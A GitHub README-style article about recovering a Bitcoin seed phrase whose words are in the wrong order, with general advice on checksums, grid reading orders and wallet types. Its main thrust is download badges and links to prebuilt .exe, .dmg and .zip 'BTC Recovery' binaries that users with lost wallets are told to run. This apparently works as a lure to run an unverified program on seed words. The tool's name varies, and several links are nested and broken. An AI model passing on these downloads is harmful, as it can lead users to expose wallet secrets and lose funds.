<div align="center">
<img src="assets/banner-article.png" alt="Seed words in the wrong order">
</div>

# Seed words in the wrong order

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A phrase with the right words in the wrong order is a solvable case, because order is a bounded property: the words exist, and the wallet only cares where each one sits. BTCRecover searches the arrangements locally, checks each candidate against an address from the wallet, and stops when one produces it.

## You'll see this if

You are confident about the words and unsure about the sequence  -  usually because they were copied from a screenshot, retyped from memory, or written in columns on paper and then read across instead of down.

| What you see | What it usually means | Where to go |
|---|---|---|
| The wallet rejects the phrase as invalid | the last word no longer matches the checksum of the others | here, or [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) if a word itself is suspect |
| The phrase is accepted and the wallet is empty | a valid arrangement, but not yours  -  or the wrong wallet type | here, then [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) |
| Some words are in the right place, others are not | a partial ordering problem, common after a retype | here, with the known positions fixed |
| Only two adjacent words are swapped | the smallest possible case | here, and it is quick |
| Words were written in a grid on paper | column-versus-row reading order | here, and try the grid reading by hand first |

## Why it happens

Order carries meaning in a phrase. The words are not a set; they are a sequence that feeds a key-derivation function, and moving any two changes every key the phrase produces. The checksum in the final word is computed over the sequence, so a swap almost always invalidates it outright  -  which is why a reordered phrase usually fails to load at all rather than opening as an empty wallet.

The exceptions are instructive. If two words are swapped and the result still passes the checksum, the wallet loads and shows nothing, because a valid but different phrase is a valid but different wallet. That case is rarer than people expect, and it is worth remembering when a "correct" phrase opens an empty wallet: possibility one is a wrong arrangement, possibility two is a different wallet type, and possibility three is a passphrase.

Grid layouts on paper cause a specific and common version of this. Words written in three columns and read left-to-right produce a sequence that looks complete and is entirely wrong, and the fix is to try the column reading order before running any search at all. The same trap appears when a phrase is retyped from a photograph: the person copying works word by word and loses the line, so a single adjacent pair swaps while everything else stays correct.

There is also a practical asymmetry worth knowing before you start. A phrase written by hand and read back by the same person tends to preserve the order; a phrase typed once, years ago, on a phone keyboard tends to lose one or two positions where the cursor moved. That difference tells you how much of the sequence to trust.

## Fix

Fix the positions you are sure of, decide whether the problem is a small local swap or a full reordering, and let a local search test arrangements against a known address.

1. **Rewrite the phrase with position numbers**, using the order you believe is correct. Ambiguity about "which word was third" is the thing to eliminate before searching.
2. **Try the reading orders by hand first.** Columns read downward, rows read across, right-to-left, and any paper-fold pattern. Two minutes of manual work removes the cheapest class of error.
3. **Mark the positions you are certain about** and let the search vary only the rest. Fixing even two known positions shrinks the space dramatically.
4. **Find an address from the wallet**  -  an old receive address or a statement entry  -  so each arrangement can be confirmed rather than guessed: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).
5. **Download the current release from the GitHub releases page** and run the seed search offline with the ordering rule set: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
6. **Watch for a valid-but-empty result.** A candidate that passes the checksum but produces no balance is a genuine result, not a bug: it means that arrangement is a real phrase for a different wallet.
7. **Confirm and move.** Restore the found arrangement into a clean wallet, check the address, then transfer the balance to a wallet with a verified backup.

## If that did not work

A finished run with no hit means the words themselves are not all right, or the target address is not from this phrase's wallet.

Test the target first, because it costs nothing: an address from a different account produces no match even for the correct phrase. Then check whether one word is likely wrong rather than the order  -  a plausible-looking substitution that is still a valid list word passes the checksum and defeats an ordering search: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) covers how candidate words are added, and [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) covers the case where one word is not in the list at all.

If the phrase came from a wallet you cannot name, the wallet type is the more likely culprit than the order. A correct sequence read through the wrong derivation is indistinguishable from a wrong sequence until you compare addresses. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) puts those checks in order.

## Prevention

- Write the phrase as a single numbered sequence, never in columns or a grid.
- Read it back against a restore before the wallet holds funds: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
- Keep the second copy in the same order and format, so a comparison is possible.
- Note the wallet type beside the backup; order errors and wallet-type errors look identical from the outside.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Does the order of seed words matter?

Yes, completely. The sequence is the input to key derivation, and changing two words changes every key. A wrong order usually fails the checksum outright, which is why a reordered phrase tends to be rejected rather than opening an empty wallet.

### My 12 words open an empty wallet. Could they be in the wrong order?

Possibly, but a different wallet type or a BIP39 passphrase produces the same symptom and is more common. Compare the first receive address before assuming order: if the address does not match, test wallet type and passphrase first, then ordering.

### Can the words be right and the checksum still fail?

Yes  -  a single word outside the list, or a typo inside it, breaks the checksum even when the other words and their order are perfect. That is a word problem rather than an ordering problem, and it needs a different search.

### How long does an ordering search take?

It depends entirely on how many positions you can fix. Two known positions and a small remaining set is a short run; a full reordering of 24 words is not something a search will finish, and hand-checking the reading order of the paper is the better first move.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Recover a seed phrase with 1-3 missing words]([Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md))
- [Restored seed shows an empty wallet]([Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md))
- [Invalid recovery phrase]([Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md))
